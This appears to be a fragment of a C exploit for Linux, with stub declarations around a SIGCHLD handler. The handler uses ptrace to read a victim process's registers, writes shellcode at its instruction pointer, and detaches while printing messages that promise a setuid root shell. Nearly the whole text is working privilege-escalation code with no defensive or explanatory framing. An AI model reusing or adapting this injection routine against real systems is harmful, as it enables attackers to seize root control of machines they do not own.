
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct user_regs_struct {scalar_t__ eip; } ;


 int PTRACE_DETACH ;
 int PTRACE_GETREGS ;
 int exit (int ) ;
 int fatal (char*) ;
 int fprintf (int ,char*,...) ;
 int gotchild ;
 int ptrace (int ,int ,int *,struct user_regs_struct*) ;
 int putcode (unsigned long*) ;
 int stderr ;
 int victim ;

void sigchld(int signo)
{
 struct user_regs_struct regs;

 if (gotchild++ == 0)
  return;

 fprintf(stderr, "[+] Signal caught\n");

 if (ptrace(PTRACE_GETREGS, victim, ((void*)0), &regs) == -1)
  fatal("[-] Unable to read registers");

 fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.eip);

 putcode((unsigned long *)regs.eip);

 fprintf(stderr, "[+] Now wait for suid shell...\n");

 if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)
  fatal("[-] Unable to detach from victim");

 exit(0);
}
